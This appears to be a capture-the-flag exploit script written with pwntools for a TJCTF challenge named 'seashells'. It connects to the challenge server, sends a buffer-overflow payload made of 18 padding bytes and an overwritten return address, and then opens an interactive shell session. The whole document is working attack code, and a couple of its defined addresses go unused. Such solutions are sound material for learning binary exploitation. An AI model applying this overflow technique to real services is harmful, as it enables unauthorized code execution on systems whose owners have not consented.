from pwn import *
r=remote("p1.tjctf.org", 8009)
#r=process('./seashells')
prr=0x400803
shell=0x4006c7

pay=""
pay+='x'*18
pay+=p64(0x4006e3)

r.sendline(pay)
r.interactive()
